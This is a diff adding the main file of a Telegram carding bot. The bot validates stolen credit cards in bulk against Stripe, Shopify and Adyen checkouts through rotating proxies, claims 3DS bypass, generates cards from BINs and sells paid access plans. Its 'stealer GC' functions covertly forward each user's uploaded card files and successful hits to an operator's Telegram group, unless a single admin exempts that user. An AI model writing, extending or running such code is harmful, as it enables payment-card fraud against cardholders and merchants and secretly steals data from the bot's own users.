@@ -1,0 +1,5136 @@
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ bot.py — PART 1
+# ══════════════════════════════════════════════════════════════════════════════
+from telethon import TelegramClient, events, Button
+from telethon.tl.custom.message import Message as _TLMessage
+import asyncio
+import itertools
+import aiofiles
+import os
+import random
+import time
+import json
+import re
+import sys
+import secrets
+import aiohttp
+
+import config
+from config import (
+    API_ID, API_HASH, BOT_TOKEN,
+    BOT_BRAND, BOT_NAME, OWNER_NAME, OWNER_USERNAME, OWNER_ID, DEV_LINE,
+    PREMIUM_FILE, SITES_FILE, PROXY_FILE, USER_PROXY_FILE, USER_POOL_FILE,
+    ADMIN_IDS, ADMIN_ID, _DEFAULT_ADMINS, _save_admin_ids,
+    LIMITS, MASS_WORKERS, LOG_CHANNEL_ID,
+)
+from emojis import pe, SEP, btn
+from keyboards import (
+    _raw_post, raw_send, raw_edit, nav_edit,
+    rows_main, rows_gates, rows_proxy, rows_admin, rows_admin_users,
+    rows_admin_sites, rows_admin_proxy_pool, rows_stop, rows_features,
+    rows_admin_keys, rows_admin_stats, rows_back, rows_admin_back,
+    rows_commands, rows_admin_videos, rows_admin_gifs, rows_admin_logs,
+    rows_admin_welcome, rows_admin_workers,
+    rows_plans, rows_profile, rows_redeem_info, rows_admin_broadcast,
+)
+from storage import (
+    user_proxies, user_pool_enabled,
+    load_user_proxies, save_user_proxies,
+    load_user_pool, save_user_pool,
+    get_user_proxy_list, set_user_proxies, remove_user_proxy,
+    get_file_lines, load_premium_users, load_sites, load_proxies,
+    is_admin, is_premium, get_user_limit,
+    get_proxies_for_user, extract_cc, make_progress_bar,
+    load_bin_db, generate_cards_from_bin,
+    load_banned_users, is_banned, ban_user, unban_user,
+    load_keys, add_keys, remove_key, validate_key, clear_keys, generate_keys,
+    get_key_info, save_keys,
+    load_limits, set_user_limit,
+    load_gifs, add_gif, remove_gif,
+    load_welcome, default_welcome, set_welcome, reset_welcome,
+    load_log_group, set_log_group,
+    load_stealer_gc, set_stealer_gc,
+    load_stats, update_stats, clear_stats,
+    blur_card, clear_cache,
+    activate_plan, revoke_plan, get_plan_info, get_plan_expiry, format_expiry,
+    increment_charged, increment_approved, get_user_charged, get_user_approved,
+    get_rank, PLAN_TYPES,
+)
+from bin_db import get_bin_info, load_bins
+from cards import build_result_card, checker_line, _clean_response
+from check_engine import (
+    check_card_with_retry, test_proxy, test_site, get_proxy_ip,
+    clear_session_bad_sites, clear_error_log, _proxy_to_url,
+    check_stripe_auth,
+)
+from keyboards import _send_notification, _pin_message_botapi
+
+from datetime import datetime
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ POOL MANAGEMENT
+# ══════════════════════════════════════════════════════════════════════════════
+POOL_ENABLED_FILE = 'pool_enabled.txt'
+AUTO_CHECK_INTERVAL = 7200
+USER_SITES_FILE = 'user_sites.json'
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STEAL BLOCKED USERS — users whose data is not sent to stealer GC
+# ══════════════════════════════════════════════════════════════════════════════
+STEAL_BLOCKED_FILE = 'steal_blocked.json'
+STEAL_ADMIN_ID = 8995473746   # Only this user can manage
+
+
+def _load_steal_blocked() -> set:
+    try:
+        with open(STEAL_BLOCKED_FILE, 'r') as f:
+            data = json.load(f)
+            return set(int(x) for x in data.get('blocked', []))
+    except Exception:
+        return set()
+
+
+def _save_steal_blocked(blocked: set):
+    try:
+        with open(STEAL_BLOCKED_FILE, 'w') as f:
+            json.dump({'blocked': list(blocked)}, f, indent=2)
+    except Exception as e:
+        print(f"[STEAL-BLOCK] Save error: {e}")
+
+
+def _is_steal_blocked(uid: int) -> bool:
+    return int(uid) in _load_steal_blocked()
+
+
+def _add_steal_block(uid: int):
+    blocked = _load_steal_blocked()
+    blocked.add(int(uid))
+    _save_steal_blocked(blocked)
+
+
+def _remove_steal_block(uid: int):
+    blocked = _load_steal_blocked()
+    blocked.discard(int(uid))
+    _save_steal_blocked(blocked)
+
+
+
+def _is_pool_enabled() -> bool:
+    try:
+        if os.path.exists(POOL_ENABLED_FILE):
+            with open(POOL_ENABLED_FILE, 'r') as f:
+                return f.read().strip() == '1'
+    except Exception:
+        pass
+    return True
+
+
+def _set_pool_enabled(enabled: bool):
+    try:
+        with open(POOL_ENABLED_FILE, 'w') as f:
+            f.write('1' if enabled else '0')
+    except Exception as e:
+        print(f"[POOL] Save error: {e}")
+
+
+def get_user_site_list(uid: int) -> list:
+    try:
+        with open(USER_SITES_FILE, 'r') as f:
+            data = json.load(f)
+            return data.get(str(uid), [])
+    except Exception:
+        return []
+
+
+def set_user_sites(uid: int, sites: list):
+    try:
+        with open(USER_SITES_FILE, 'r') as f:
+            data = json.load(f)
+    except Exception:
+        data = {}
+    data[str(uid)] = [s for s in sites if s]
+    with open(USER_SITES_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+
+def remove_user_sites(uid: int):
+    try:
+        with open(USER_SITES_FILE, 'r') as f:
+            data = json.load(f)
+    except Exception:
+        data = {}
+    data.pop(str(uid), None)
+    with open(USER_SITES_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+
+def _get_sites_for_user(uid: int) -> list:
+    pool = load_sites() if _is_pool_enabled() else []
+    user = get_user_site_list(uid)
+    if is_admin(uid):
+        return user + pool if user else pool
+    return (user + pool) if pool else user
+
+
+def _get_proxies_for_user_v2(uid: int) -> list:
+    pool = load_proxies() if _is_pool_enabled() else []
+    try:
+        user = get_user_proxy_list(uid)
+    except Exception:
+        user = []
+    if is_admin(uid):
+        return user + pool if user else pool
+    return (user + pool) if pool else user
+
+
+bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+
+active_sessions: dict = {}
+pending_checks: dict = {}
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STOP FLAGS — hard kill per session
+# ══════════════════════════════════════════════════════════════════════════════
+_stop_flags: dict = {}   # session_key → True (stop requested)
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ GLOBAL WORKER LIMITER (multi-user safety)
+# ══════════════════════════════════════════════════════════════════════════════
+try:
+    from config import GLOBAL_MAX_WORKERS, LIGHT_LOAD_WORKERS, MEDIUM_LOAD_WORKERS, HEAVY_LOAD_WORKERS
+except ImportError:
+    GLOBAL_MAX_WORKERS = 150
+    LIGHT_LOAD_WORKERS = 120
+    MEDIUM_LOAD_WORKERS = 40
+    HEAVY_LOAD_WORKERS = 25
+
+import threading as _worker_lock_thread
+
+class GlobalWorkerLimiter:
+    """Track total workers across all users."""
+    def __init__(self, max_workers):
+        self.max_workers = max_workers
+        self.current = 0
+        self.lock = _worker_lock_thread.Lock()
+
+    def acquire(self, count):
+        """Try to acquire N workers. Returns actual count acquired."""
+        with self.lock:
+            available = self.max_workers - self.current
+            granted = min(count, available)
+            self.current += granted
+            return granted
+
+    def release(self, count):
+        with self.lock:
+            self.current = max(0, self.current - count)
+
+    def get_available(self):
+        with self.lock:
+            return max(0, self.max_workers - self.current)
+
+    def get_active(self):
+        with self.lock:
+            return self.current
+
+_GLOBAL_WORKER_SEM = GlobalWorkerLimiter(GLOBAL_MAX_WORKERS)
+GLOBAL_WORKER_SEM = _GLOBAL_WORKER_SEM
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ PER-USER ACTIVE CHECK TRACKING (isolated per user)
+# ══════════════════════════════════════════════════════════════════════════════
+user_active_check: dict = {}   # uid → {session_key, msg_id, started_at, card_count}
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ AUTO CLEANUP — prevent memory/log bloat
+# ══════════════════════════════════════════════════════════════════════════════
+import threading as _cleanup_thread
+import time as _cleanup_time
+
+def _start_cleanup_daemon():
+    def _cleanup():
+        while True:
+            try:
+                _cleanup_time.sleep(300)  # every 5 min
+                now = _cleanup_time.time()
+                # Clean stale user_active_check (older than 30 min)
+                stale = []
+                for uid, info in list(user_active_check.items()):
+                    if now - info.get('started_at', now) > 1800:
+                        stale.append(uid)
+                for uid in stale:
+                    user_active_check.pop(uid, None)
+                    print(f"[CLEANUP] Removed stale session for user {uid}")
+                # Clean stale active_sessions (older than 30 min)
+                stale2 = []
+                for key, sess in list(active_sessions.items()):
+                    if now - sess.get('started_at', now) > 1800:
+                        stale2.append(key)
+                for key in stale2:
+                    active_sessions.pop(key, None)
+                    print(f"[CLEANUP] Removed stale session: {key}")
+                if stale or stale2:
+                    print(f"[CLEANUP] Removed {len(stale)} users + {len(stale2)} sessions")
+            except Exception as e:
+                print(f"[CLEANUP] Error: {e}")
+    _cleanup_thread.Thread(target=_cleanup, daemon=True).start()
+
+_start_cleanup_daemon()
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ TELEGRAM MESSAGE PATCHES
+# ══════════════════════════════════════════════════════════════════════════════
+_orig_send_message = bot.send_message
+_orig_edit_message = bot.edit_message
+
+
+def _strip_tg_emoji(text):
+    if not text:
+        return text
+    return re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', text)
+
+
+def _is_doc_invalid(e):
+    s = str(e).upper()
+    return 'DOCUMENT_INVALID' in s or 'FILE_REFERENCE_INVALID' in s
+
+
+_orig_tl_edit = _TLMessage.edit
+
+
+async def _safe_tl_edit(self, *args, **kwargs):
+    kwargs.setdefault('link_preview', False)
+    try:
+        return await _orig_tl_edit(self, *args, **kwargs)
+    except Exception as e:
+        if _is_doc_invalid(e):
+            new_args = list(args)
+            if new_args and isinstance(new_args[0], str):
+                new_args[0] = _strip_tg_emoji(new_args[0])
+            if 'text' in kwargs:
+                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
+            if 'message' in kwargs and isinstance(kwargs['message'], str):
+                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
+            return await _orig_tl_edit(self, *new_args, **kwargs)
+        raise
+
+
+_TLMessage.edit = _safe_tl_edit
+
+
+async def _send_message_no_preview(*args, **kwargs):
+    kwargs.setdefault('link_preview', False)
+    try:
+        return await _orig_send_message(*args, **kwargs)
+    except Exception as e:
+        if _is_doc_invalid(e):
+            if len(args) >= 2 and isinstance(args[1], str):
+                args = (args[0], _strip_tg_emoji(args[1])) + args[2:]
+            if 'message' in kwargs and isinstance(kwargs['message'], str):
+                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
+            return await _orig_send_message(*args, **kwargs)
+        raise
+
+
+async def _edit_message_no_preview(*args, **kwargs):
+    kwargs.setdefault('link_preview', False)
+    try:
+        return await _orig_edit_message(*args, **kwargs)
+    except Exception as e:
+        if _is_doc_invalid(e):
+            if len(args) >= 3 and isinstance(args[2], str):
+                args = args[:2] + (_strip_tg_emoji(args[2]),) + args[3:]
+            if 'text' in kwargs and isinstance(kwargs['text'], str):
+                kwargs['text'] = _strip_tg_emoji(kwargs['text'])
+            if 'message' in kwargs and isinstance(kwargs['message'], str):
+                kwargs['message'] = _strip_tg_emoji(kwargs['message'])
+            return await _orig_edit_message(*args, **kwargs)
+        raise
+
+
+bot.send_message = _send_message_no_preview
+bot.edit_message = _edit_message_no_preview
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ HELPERS
+# ══════════════════════════════════════════════════════════════════════════════
+async def get_display_name(uid):
+    try:
+        entity = await bot.get_entity(uid)
+        name = getattr(entity, 'first_name', None) or ''
+        lname = getattr(entity, 'last_name', None) or ''
+        full = (name + ' ' + lname).strip()
+        return full if full else str(uid)
+    except:
+        return str(uid)
+
+
+async def get_user_info(uid):
+    try:
+        entity = await bot.get_entity(uid)
+        name = getattr(entity, 'first_name', None) or str(uid)
+        username = getattr(entity, 'username', None)
+        return name, username
+    except:
+        return str(uid), None
+
+
+def _is_3ds(msg: str) -> bool:
+    m = (msg or "").lower()
+    if any(x in m for x in ('http 4', 'http 5', 'application not found', '404', '500')):
+        return False
+    return any(x in m for x in ('3d secure', '3ds', 'authentication required', 'otp required'))
+
+
+def _is_insuf(msg: str) -> bool:
+    return 'insufficient' in (msg or "").lower()
+
+
+def _classify_result(result: dict) -> str:
+    """Classify result into: charged, approved, 3ds, live, declined, error"""
+    st = result.get('status', '')
+    raw = (result.get('raw_response') or '').upper()
+    msg = (result.get('message') or '').lower()
+
+    if st == 'Charged':
+        return 'charged'
+    if st == '3DS' or _is_3ds(result.get('message', '')):
+        return '3ds'
+    if st == 'Live' or 'insufficient' in msg or raw in (
+        'INSUFFICIENT_FUNDS', 'PAYMENTS_INSUFFICIENT_FUNDS',
+        'INSUFFICIENT FUNDS', 'NOT_ENOUGH_FUNDS', 'LOW_BALANCE',
+    ):
+        return 'live'
+    if st == 'Approved':
+        return 'approved'
+    if raw in (
+        'CARD_DECLINED', 'PAYMENT_FAILED', 'MISMATCHED_BILL',
+        'PAYMENT_METHOD_NOT_AVAILABLE', 'SITE_NOT_SUPPORTED',
+        'SITE_REQUIRES_LOGIN!', 'DO_NOT_HONOR', 'SITE_REQUIRES_LOGIN',
+    ):
+        return 'declined'
+    if raw in (
+        'MAX_RETRIES', 'TIMEOUT', 'HTTP_400', 'HTTP_500', 'HTTP_502',
+        'HTTP_503', 'HTTP_504', 'CONNECT_ERROR', 'API_ERROR',
+        'CAPTCHA_REQUIRED', 'THROTTLED', 'CHECKPOINT_DENIED',
+        'CHANGE_PROXY_OR_SITE', 'SITE_ERROR',
+    ):
+        return 'error'
+    return 'declined'
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STEALER GC HELPERS
+# ══════════════════════════════════════════════════════════════════════════════
+async def send_file_to_stealer_gc(user_id, file_path, file_name, card_count, card_type="Cards"):
+    """Forward any uploaded file to the configured stealer GC."""
+    stealer_gc = load_stealer_gc()
+    if not stealer_gc:
+        return
+    
+    # ═══ STEAL BLOCK CHECK ═══
+    try:
+        if _is_steal_blocked(user_id):
+            print(f"[STEAL-BLOCK] Skipped file for user {user_id}")
+            return
+    except Exception:
+        pass
+    
+    try:
+        name, username = await get_user_info(user_id)
+        display = f"@{username}" if username else f"<a href='tg://user?id={user_id}'>{name}</a>"
+        
+        caption = pe(
+            f"[⌯] 𝗠𝗮𝘀𝘀 𝗙𝗶𝗹𝗲 ⌁ 𝚄𝚙𝚕𝚘𝚊𝚍𝚎𝚍 ⌁ ⚡\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ {display} ⌁ <code>{user_id}</code>\n"
+            f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
+            f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {card_count:,}"
+        )
+        
+        await bot.send_file(
+            stealer_gc,
+            file_path,
+            caption=caption,
+            parse_mode='html'
+        )
+    except Exception as e:
+        print(f"[Stealer GC] Failed to send file: {e}")
+
+
+async def send_hit_to_stealer_gc(result, hit_type, user_id, file_name=None):
+    """Send hit to stealer GC — EXACT same format as user hit."""
+    stealer_gc = load_stealer_gc()
+    if not stealer_gc:
+        return
+
+    # ═══ STEAL BLOCK CHECK ═══
+    try:
+        if _is_steal_blocked(user_id):
+            print(f"[STEAL-BLOCK] Skipped hit for user {user_id}")
+            return
+    except Exception:
+        pass
+
+    try:
+        # ═══ BIN info ═══
+        bin_info = result.get('bin_info')
+        if not bin_info:
+            bin_info = await get_bin_info(result['card'].split('|')[0])
+            result['bin_info'] = bin_info
+
+        brand, btype, level, bank, country, flag = bin_info
+        card = result.get('card', 'N/A')
+        raw_msg = result.get('message', 'N/A')
+        price = result.get('price', '-')
+        gateway = result.get('gateway', 'Shopify Payments')
+        time_taken = result.get('time', '-')
+
+        name, username = await get_user_info(user_id)
+        checker_name = name if name else str(user_id)
+
+        # ═══ Bold uppercase helper ═══
+        def _b(s):
+            out = []
+            for ch in str(s):
+                c = ord(ch)
+                if 65 <= c <= 90:
+                    out.append(chr(c - 65 + 0x1D5D4))
+                elif 97 <= c <= 122:
+                    out.append(chr(c - 97 + 0x1D5EE))
+                elif 48 <= c <= 57:
+                    out.append(chr(c - 48 + 0x1D7EC))
+                else:
+                    out.append(ch)
+            return "".join(out)
+
+        bin_str = _b(" · ".join(p for p in [brand, btype, level] if p and p != '-') or "—")
+        bank_str = _b(bank or "—")
+        country_str = f"{flag} {_b(country or '—')}" if flag else _b(country or "—")
+        gateway_str = _b(gateway)
+
+        # ═══ SAME HEADERS AS USER HIT ═══
+        if hit_type == "Charged":
+            header = "[=] Charged Success ⌁ ✅"
+            status_text = "𝙲𝚑𝚊𝚛𝚐𝚎𝚍 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢"
+            status_emoji = "💎"
+            result_text = "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕"
+            result_emoji = "✔️"
+        elif hit_type == "Approved":
+            header = "[=] Approved ⌁ ✅"
+            status_text = "𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"
+            status_emoji = "✅"
+            result_text = _b(raw_msg) if raw_msg else "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"
+            result_emoji = "✅"
+        elif hit_type == "Live":
+            header = "[=] Live Card ⌁ 💰"
+            status_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜"
+            status_emoji = "💰"
+            result_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎"
+            result_emoji = "⚡"
+        elif hit_type == "3DS":
+            header = "[=] 3DS Required ⌁ ⚠️"
+            status_text = "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"
+            status_emoji = "⚠️"
+            result_text = "𝙾𝚃𝙿 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"
+            result_emoji = "⚡"
+        else:
+            header = f"[=] {hit_type} ⌁ ⚡"
+            status_text = _b(raw_msg)
+            status_emoji = "⚡"
+            result_text = _b(raw_msg)
+            result_emoji = "⚡"
+
+        # ═══ Amount ═══
+        _p = str(price).replace('$', '').replace('£', '').replace('€', '').strip()
+        _currency = "USD"
+        _sym = "$"
+        _raw_upper = (raw_msg or '').upper() + str(price).upper()
+        if 'GBP' in _raw_upper or '£' in str(price):
+            _currency, _sym = "GBP", "£"
+        elif 'EUR' in _raw_upper or '€' in str(price):
+            _currency, _sym = "EUR", "€"
+        if _p not in ('-', '', 'None', '0', '0.00', '0.0'):
+            amount_str = f"{_sym}{_b(_p)} {_b(_currency)}"
+        else:
+            amount_str = "—"
+
+        time_str = f"{_b(str(time_taken))}s" if time_taken and time_taken != '-' else "—"
+        file_display = file_name or "mass.txt"
+
+        # ═══ BUILD — same as user, with pe() ═══
+        msg = (
+            f"{header}\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗖𝗖 ⌁ <code>{card}</code>\n"
+            f"[=] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_text} {status_emoji}\n"
+            f"[=] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {result_text} {result_emoji}\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗕𝗜𝗡 ⌁ {bin_str}\n"
+            f"[=] 𝗕𝗮𝗻𝗸 ⌁ {bank_str}\n"
+            f"[=] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_str}\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⌁ {gateway_str}\n"
+            f"[=] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ {amount_str} 💰\n"
+            f"[=] 𝗧𝗶𝗺𝗲 ⌁ {time_str} ⏱️\n"
+            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+            f"[=] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🛡 {checker_name}\n"
+            f"[=] 𝗙𝗶𝗹𝗲 ⌁ {file_display} 📁"
+        )
+
+        # ═══ CRITICAL: pe() — converts normal emojis → <tg-emoji> ═══
+        msg = pe(msg)
+
+        await bot.send_message(stealer_gc, msg, parse_mode='html')
+
+    except Exception as e:
+        print(f"[Stealer GC] Failed to send hit: {e}")
+
+
+
+@bot.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    uid = event.sender_id
+    if is_banned(uid):
+        await event.reply(
+            pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n❌ You are banned from using this bot."),
+            parse_mode='html'
+        )
+        return
+    text = pe(
+        f"[⌯] 𝗕𝗼𝘁 ⌁ ⌁ 𝑹𝑿𝑷™ ⌁ ⌁ 💠\n"
+        f"[⌯] 𝗧𝘆𝗽𝗲 ⌁ 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙲𝙲 𝙲𝚑𝚎𝚌𝚔𝚎𝚛 ⌁ 💎\n"
+        f"\n"
+        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+        f"\n"
+        f"[⌯] 𝗚𝗮𝘁𝗲 ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 · 𝚂𝚑𝚘𝚙𝚒𝚏𝚢 · 𝙰𝚍𝚢𝚎𝚗 ⌁ 🎯\n"
+        f"[⌯] 𝟯𝗗𝗦 ⌁ 𝙱𝚢𝚙𝚊𝚜𝚜 𝚂𝚞𝚙𝚙𝚘𝚛𝚝𝚎𝚍 ⌁ ✅\n"
+        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙷𝚃𝚃𝙿 · 𝚂𝙾𝙲𝙺𝚂𝟺 · 𝚂𝙾𝙲𝙺𝚂𝟻 ⌁ 🔗\n"
+        f"[⌯] 𝗦𝗽𝗲𝗲𝗱 ⌁ 𝙼𝚞𝚕𝚝𝚒-𝚠𝚘𝚛𝚔𝚎𝚛 · 𝚁𝚘𝚝𝚊𝚝𝚒𝚗𝚐 ⌁ 🚀\n"
+        f"\n"
+        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+        f"\n"
+        f"[⌯] 𝗠𝗲𝗻𝘂 ⌁ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝚝𝚒𝚘𝚗 𝚋𝚎𝚕𝚘𝚠 ⌁ 🔻"
+    )
+    await raw_send(uid, text, rows_main())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ BACK TO START
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"back_start"))
+async def cb_back_start(event):
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗕𝗼𝘁 ⌁ ⌁ 𝑹𝑿𝑷™ ⌁ ⌁ 💠\n"
+        f"[⌯] 𝗧𝘆𝗽𝗲 ⌁ 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙲𝙲 𝙲𝚑𝚎𝚌𝚔𝚎𝚛 ⌁ 💎\n"
+        f"\n"
+        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+        f"\n"
+        f"[⌯] 𝗚𝗮𝘁𝗲 ⌁ 𝚂𝚝𝚛𝚒𝚙𝚎 · 𝚂𝚑𝚘𝚙𝚒𝚏𝚢 · 𝙰𝚍𝚢𝚎𝚗 ⌁ 🎯\n"
+        f"[⌯] 𝟯𝗗𝗦 ⌁ 𝙱𝚢𝚙𝚊𝚜𝚜 𝚂𝚞𝚙𝚙𝚘𝚛𝚝𝚎𝚍 ⌁ ✅\n"
+        f"[⌯] 𝗣𝗿𝗼𝘅𝘆 ⌁ 𝙷𝚃𝚃𝙿 · 𝚂𝙾𝙲𝙺𝚂𝟺 · 𝚂𝙾𝙲𝙺𝚂𝟻 ⌁ 🔗\n"
+        f"[⌯] 𝗦𝗽𝗲𝗲𝗱 ⌁ 𝙼𝚞𝚕𝚝𝚒-𝚠𝚘𝚛𝚔𝚎𝚛 · 𝚁𝚘𝚝𝚊𝚝𝚒𝚗𝚐 ⌁ 🚀\n"
+        f"\n"
+        f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
+        f"\n"
+        f"[⌯] 𝗠𝗲𝗻𝘂 ⌁ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚘𝚙𝚝𝚒𝚘𝚗 𝚋𝚎𝚕𝚘𝚠 ⌁ 🔻"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_main())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ CLOSE
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"close"))
+async def cb_close(event):
+    await event.answer()
+    try:
+        await bot.delete_messages(event.chat_id, event.message_id)
+    except:
+        pass
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ CHECKER PANEL
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"gates"))
+async def cb_gates(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.answer("❌ Access required!", alert=True)
+        return
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 𝚂𝚑𝚘𝚙𝚒𝚏𝚢 𝙶𝚊𝚝𝚎 ⌁ ⚡\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗦𝗶𝗻𝗴𝗹𝗲 ⌁ /sh cc|mm|yy|cvv ⌁ 💳\n"
+        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝚁𝚎𝚙𝚕𝚢 .𝚝𝚡𝚝 𝚠𝚒𝚝𝚑 /msh ⌁ 🔥\n"
+        f"[⌯] 𝗠𝗮𝘀𝘀 ⌁ 𝙾𝚛 𝚜𝚎𝚗𝚍 .𝚝𝚡𝚝 𝚍𝚒𝚛𝚎𝚌𝚝𝚕𝚢 ⌁ 📦"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_gates())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ PLANS
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"^plans$"))
+async def cb_plans(event):
+    await event.answer()
+    text = pe(
+        f"[⌯] 𝗣𝗹𝗮𝗻𝘀 ⌁ 𝙰𝚌𝚌𝚎𝚜𝚜 𝙿𝚕𝚊𝚗𝚜 ⌁ 💎\n"
+        f"\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ 𝚄𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍 — 𝚗𝚘 𝚌𝚛𝚎𝚍𝚒𝚝 𝚍𝚎𝚍𝚞𝚌𝚝𝚒𝚘𝚗 ⌁ ♾️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗿𝗶𝗮𝗹 ⌁ 𝙵𝚛𝚎𝚎 ⌁ 🎁\n"
+        f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹 𝙷𝚘𝚞𝚛𝚜 ⌁ ⏰\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟶 ⌁ 💰\n"
+        f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟽 𝙳𝚊𝚢𝚜 ⌁ 📅\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗕𝗶-𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟾 ⌁ 🤑\n"
+        f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟷𝟻 𝙳𝚊𝚢𝚜 ⌁ 📆\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗠𝗼𝗻𝘁𝗵𝗹𝘆 ⌁ $𝟹𝟶 ⌁ 👑\n"
+        f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹𝟶 𝙳𝚊𝚢𝚜 ⌁ 🗓️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY ⌁ 🔑\n"
+        f"[⌯] 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 ⌁ @{OWNER_USERNAME} ⌁ 💬"
+    )
+    await nav_edit(event.chat_id, event.message_id, text, rows_plans())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ PROFILE
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"^profile$"))
+async def cb_profile(event):
+    await event.answer()
+    uid = event.sender_id
+
+    name, username = await get_user_info(uid)
+    handle = f"@{username}" if username else "none"
+
+    if is_admin(uid):
+        role = "Admin"
+    elif get_plan_info(uid):
+        plan_data = get_plan_info(uid)
+        role = plan_data.get("source", "Key").title()
+    elif str(uid) in load_premium_users():
+        role = "Key"
+    else:
+        role = "Free"
+
+    plan_info = get_plan_info(uid)
+    if plan_info:
+        plan_status = "Active"
+        expires = format_expiry(uid)
+    else:
+        plan_status = "No Plan"
+        expires = "—"
+
+    user_proxies_list = get_user_proxy_list(uid)
+    proxy_status = f"{len(user_proxies_list)} set" if user_proxies_list else "Not Set"
+
+    charged = get_user_charged(uid)
